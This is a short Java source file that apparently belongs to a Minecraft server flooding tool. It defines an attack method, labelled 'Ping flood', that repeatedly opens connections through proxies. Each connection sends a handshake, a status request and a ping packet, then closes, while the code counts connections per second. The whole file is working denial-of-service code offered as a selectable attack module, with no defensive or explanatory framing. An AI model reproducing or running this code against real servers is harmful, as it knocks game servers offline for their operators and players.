package dev.lastknell.core.methods.impl;

import dev.lastknell.core.NettyBootstrap;
import dev.lastknell.core.methods.IMethod;
import dev.lastknell.core.packets.Handshake;
import dev.lastknell.core.packets.PingPacket;
import dev.lastknell.core.proxy.Proxy;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class Ping implements IMethod{

    private NettyBootstrap service;
    private byte[] handshakebytes;
    @Override
    public void accept(Channel channel, Proxy proxy) {
        service.oppnedCPS++;
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshakebytes));
        channel.writeAndFlush(Unpooled.buffer().writeBytes(new byte[] { 1, 0 }));
        channel.writeAndFlush(Unpooled.buffer().writeBytes((new PingPacket(System.currentTimeMillis())).getWrappedPacket()));
        channel.close();
        service.successfulCPS++;
    }

    @Override
    public void init(NettyBootstrap service) {
        this.service = service;
        handshakebytes = new Handshake(service.protocolID, service.srvIp, service.port, 1).getWrappedPacket();
    }

    @Override
    public String getName() {
        return "Ping";
    }

    @Override
    public String getDesc() {
        return "Ping flood";
    }

    @Override
    public boolean isExperimental() {
        return false;
    }
    
}
